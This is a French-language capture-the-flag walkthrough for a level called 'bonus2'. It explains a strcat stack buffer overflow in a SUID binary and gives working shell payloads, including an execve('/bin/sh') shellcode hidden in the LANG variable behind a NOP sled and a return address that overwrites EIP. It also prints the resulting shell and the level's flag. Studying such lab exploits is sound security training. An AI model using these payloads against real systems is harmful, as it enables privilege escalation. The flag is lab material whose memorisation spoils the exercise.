# Bonus2 - Walkthrough

## Objectif
Injecter un **shellcode dans la variable d'environnement `LANG`** et exploiter un overflow dans `greetuser()` via `strcat` pour écraser EIP avec une adresse dans le NOP sled.

**Technique** : Stack Buffer Overflow via strcat + Shellcode dans variable d'environnement

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
# ⚠️ Bit SUID actif → s'exécute avec les droits de bonus3

./bonus2 bla bla
# Hello bla
```

### 2. Analyse du code (Ghidra)

```cpp
void greetuser(char *param_1) {
    char buffer[64];
    
    if (lang == 1)        strncpy(buffer, "Hyvää päivää ", 14);   // fi : 14 bytes
    else if (lang == 2)   strncpy(buffer, "Goedemiddag! ", 13);   // nl : 13 bytes
    else                  strncpy(buffer, "Hello ", 6);            // défaut : 6 bytes
    
    strcat(buffer, param_1);  // ⚠️ Pas de limite ! Overflow si param_1 trop long
    puts(buffer);
}

int main(int argc, char **argv) {
    char combined[76];               // 40 + 32 + null + padding
    
    char *env_lang = getenv("LANG");
    if (env_lang) {
        if (strcmp(env_lang, "fi") == 0) lang = 1;
        else if (strcmp(env_lang, "nl") == 0) lang = 2;
    }
    
    memset(combined, 0, 76);
    strncpy(combined, argv[1], 40);      // Max 40 bytes de argv[1]
    strncpy(combined + 40, argv[2], 32); // Max 32 bytes de argv[2] à l'offset 40
    
    greetuser(combined);
    return 0;
}
```

**Vulnérabilité** : `strcat(buffer, param_1)` dans `greetuser()` sans vérification — si `param_1` est suffisamment long, on déborde `buffer[64]`.

### 3. Trouver l'offset EIP selon LANG

**Sans LANG** (prefix "Hello " = 6 bytes) :
```bash
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3...
eip = 0x08006241  # Pas suffisant pour atteindre EIP
```

**Avec LANG=fi** (prefix "Hyvää päivää " = 14 bytes) :
```bash
export LANG=fi
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3...
eip = 0x41366141  # offset = 18
```

**Avec LANG=nl** (prefix "Goedemiddag! " = 13 bytes) :
```bash
export LANG=nl
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3...
eip = 0x38614137  # offset = 23
```

→ **LANG=nl** : offset EIP = **23** bytes dans argv[2]
→ **LANG=fi** : offset EIP = **18** bytes dans argv[2]

### 4. Injecter le shellcode dans LANG

Le shellcode va dans `LANG`, précédé du préfixe de langue + NOP sled. `getenv("LANG")` compare uniquement le début (`"nl"` ou `"fi"`), donc on peut coller le shellcode après.

```bash
export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

**Shellcode** (21 bytes) : `execve("/bin/sh", NULL, NULL)`
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

### 5. Trouver l'adresse du NOP sled dans LANG

```bash
(gdb) b *main+125
(gdb) run $(python -c 'print "A"*40') bla
(gdb) x/20s *((char**)environ)
# Trouver LANG dans la liste → adresse de base, ex: 0xbffffeb4
# Ajouter ~50 bytes (skip "nl" + début NOP sled) → 0xbffffee6
```

Choisir `0xbffffee6` (au milieu de la zone NOP).

### 6. Construction du payload

**Avec LANG=nl (offset=23)** :
```bash
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
```

**Avec LANG=fi (offset=18)** :
```bash
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xe6\xfe\xff\xbf"')
```

### 7. Exploitation

```bash
export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
```

**Résultat** :
```bash
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

---

## Déroulement de l'attaque

```
1. export LANG="nl" + NOP*100 + shellcode
   → getenv("LANG") commence par "nl" → lang = 2 ✅

2. main() :
   combined[0..39]  = "A"*40  (argv[1])
   combined[40..62] = "B"*23 + 0xbffffee6  (argv[2])

3. greetuser(combined) :
   buffer = "Goedemiddag! " (13 bytes)
   strcat(buffer, combined) → buffer = "Goedemiddag! " + "A"*40 + "B"*23 + addr
   Total = 13 + 40 + 23 + 4 = 80 bytes dans buffer[64]
   → Déborde ! EIP = 0xbffffee6 ✅

4. ret → 0xbffffee6 → NOP sled dans LANG → shellcode → /bin/sh 🎉
```

---

## Flag
```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Type de vulnérabilité
- Stack-based Buffer Overflow via strcat (CWE-121)
- Shellcode dans variable d'environnement
- NOP sled technique
- Offset variable selon langue
- SUID privilege escalation (CWE-250)
